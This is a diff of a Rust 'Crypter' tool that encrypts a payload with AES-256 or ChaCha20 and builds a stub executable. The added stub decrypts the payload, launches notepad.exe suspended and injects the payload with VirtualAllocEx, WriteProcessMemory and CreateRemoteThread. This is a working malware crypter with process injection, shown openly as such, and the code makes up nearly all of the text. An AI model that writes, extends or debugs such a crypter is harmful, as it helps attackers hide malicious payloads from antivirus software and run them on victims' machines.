@@ -1,15 +1,14 @@
 use std::fs;
 use std::io::{self, Write};
 use std::process::Command;
-use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce, aead::Aead};
+use std::path::Path;
+use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce, aead::{Aead, AeadCore}};
 use chacha20poly1305::{ChaCha20Poly1305, Key as ChaChaKey, Nonce as ChaChaNonce, aead::Aead as ChaChaAead};
 use rand::rngs::OsRng;
 use rand::RngCore;
-use hex;
 
 fn main() {
     println!("Crypter :: Choose or die!");
-
     let output_format = user_choice("Select output format (1: EXE, 2: DLL): ", &["1", "2"]);
     let enc_method = user_choice("Select encryption method (1: AES-256, 2: ChaCha20): ", &["1", "2"]);
     let verbose_method = user_choice("Enable verbose mode? (y/n): ", &["y", "n"]);
@@ -23,10 +22,6 @@ fn main() {
 
     let payload = fs::read(&input_file).expect("Unable to read input file");
     let (encrypted_payload, key, nonce) = encrypt_payload(&payload, encryption_type, verbose);
-
-    if verbose {
-        println!("[Verbose] Encrypted payload size: {} bytes", encrypted_payload.len());
-    }
 
     generate_stub(&encrypted_payload, &key, &nonce, encryption_type, output_type);
 }
@@ -85,39 +80,144 @@ fn generate_random_bytes(len: usize) -> Vec<u8> {
 }
 
 fn generate_stub(encrypted_payload: &[u8], key: &[u8], nonce: &[u8], encryption_type: &str, output_type: &str) {
+    let project_path = "stub_project";
+    let src_path = format!("{}/src", project_path);
+
+    if !Path::new(&src_path).exists() {
+        fs::create_dir_all(&src_path).expect("Failed to create stub project directories");
+    }
+
+    // Generate valid Rust array literals
     let stub_code = format!(
         r#"
-    use std::fs;
+        use std::ffi::CString;
+        use std::ptr::null_mut;
+        use windows::core::{{PCSTR, PSTR}};
+        use windows::Win32::Foundation::HANDLE;
+        use windows::Win32::System::Memory::{{VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READWRITE}};
+        use windows::Win32::System::Threading::{{
+            CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED, CreateRemoteThread
+        }};
+        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+        use aes_gcm::{{Aes256Gcm, Key, Nonce, aead::{{Aead, KeyInit}}}};
+        use chacha20poly1305::{{ChaCha20Poly1305, Key as ChaChaKey, Nonce as ChaChaNonce, aead::Aead as ChaChaAead}};
 
-    const ENCRYPTED_PAYLOAD: &[u8] = &{encrypted_payload};
-    const KEY: &[u8] = &{key};
-    const NONCE: &[u8] = &{nonce};
+        const ENCRYPTED_PAYLOAD: &[u8] = &{:?};
+        const KEY: &[u8] = &{:?};
+        const NONCE: &[u8] = &{:?};
+        const ENCRYPTION_TYPE: &str = "{}";
 
-    fn main() {{
-        let output_path = format!("decrypted.{{}}", "{output_type}");
-        println!("Decryption stub running...");
-        fs::write(&output_path, ENCRYPTED_PAYLOAD).expect("Failed to write decrypted file");
-        println!("[*] Decrypted file saved as {{}}", output_path);
-    }}
+        fn decrypt_and_execute() {{
+            let decrypted = if ENCRYPTION_TYPE == "AES-256" {{
+                let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(KEY));
+                cipher.decrypt(Nonce::from_slice(NONCE), ENCRYPTED_PAYLOAD).expect("Decryption failed")
+            }} else {{
+                let cipher = ChaCha20Poly1305::new(ChaChaKey::from_slice(KEY));
+                cipher.decrypt(ChaChaNonce::from_slice(NONCE), ENCRYPTED_PAYLOAD).expect("Decryption failed")
+            }};
+
+            let mut startup_info: STARTUPINFOA = unsafe {{ std::mem::zeroed() }};
+            let mut process_info: PROCESS_INFORMATION = unsafe {{ std::mem::zeroed() }};
+
+            let mut command_line = CString::new("C:\\Windows\\System32\\notepad.exe").unwrap();
+            let mut command_line_buffer = command_line.into_bytes_with_nul();
+            let command_line_ptr = PSTR(command_line_buffer.as_mut_ptr());
+
+            let success = unsafe {{
+                CreateProcessA(
+                    PCSTR::null(),
+                    command_line_ptr,
+                    None,
+                    None,
+                    false,
+                    CREATE_SUSPENDED,
+                    None,
+                    None,
+                    &mut startup_info,
+                    &mut process_info
+                )
+            }};
+
+            if !success.as_bool() {{
+                eprintln!("CreateProcessA failed");
+                return;
+            }}
+
+            let base_address = unsafe {{
+                VirtualAllocEx(
+                    process_info.hProcess,
+                    None,
+                    decrypted.len(),
+                    MEM_COMMIT,
+                    PAGE_EXECUTE_READWRITE,
+                )
+            }};
+
+            if base_address.is_null() {{
+                eprintln!("VirtualAllocEx failed");
+                return;
+            }}
+
+            let mem_success = unsafe {{
+                WriteProcessMemory(
+                    process_info.hProcess,
+                    base_address,
+                    decrypted.as_ptr() as _,
+                    decrypted.len(),
+                    None
+                )
+            }};
+
+            if !mem_success.as_bool() {{
+                eprintln!("WriteProcessMemory failed");
+                return;
+            }}
+
+            let remote_thread = unsafe {{
+                CreateRemoteThread(
+                    process_info.hProcess,
+                    None,
+                    0,
+                    Some(std::mem::transmute(base_address)),
+                    Some(null_mut()), // Fix: Wrap `null_mut()` in `Some()`
+                    0,
+                    None
+                )
+            }}.expect("CreateRemoteThread failed"); // Fix: Handle the Result type
+
+
+            if remote_thread.is_invalid() {{
+                eprintln!("CreateRemoteThread failed");
+                return;
+            }}
+
+            unsafe {{
+                ResumeThread(process_info.hThread);
+            }}
+        }}
+
+        fn main() {{
+            decrypt_and_execute();
+        }}
     "#,
-        encrypted_payload = format!("{:?}", encrypted_payload),
-        key = format!("{:?}", key),
-        nonce = format!("{:?}", nonce),
-        output_type = output_type
+        encrypted_payload, key, nonce, encryption_type
     );
 
-    fs::write("stub.rs", stub_code).expect("Failed to write stub code");
-    println!("[*] Stub written to stub.rs");
+    fs::write(format!("{}/src/main.rs", project_path), stub_code).expect("Failed to write stub code");
 
-    println!("[*] Compiling stub...");
-    let status = Command::new("rustc")
-        .args(&["stub.rs", "-o", &format!("decrypted.{}", output_type)])
-        .status()
-        .expect("Failed to execute rustc");
+    println!("[*] Stub project created in stub_project/");
 
-    if status.success() {
-        println!("[*] Compilation successful: decrypted.{}", output_type);
+    let output = Command::new("cargo")
+        .args(&["build", "--release"])
+        .current_dir(project_path)
+        .output()
+        .expect("Failed to execute cargo build");
+
+    if output.status.success() {
+        let output_filename = format!("{}/target/release/stub{}", project_path, if output_type == "exe" { ".exe" } else { ".dll" });
+        println!("[*] Compilation successful: {}", output_filename);
     } else {
-        println!("[!] Compilation failed.");
+        eprintln!("[!] Cargo build failed.");
+        eprintln!("{}", String::from_utf8_lossy(&output.stderr));
     }
 }
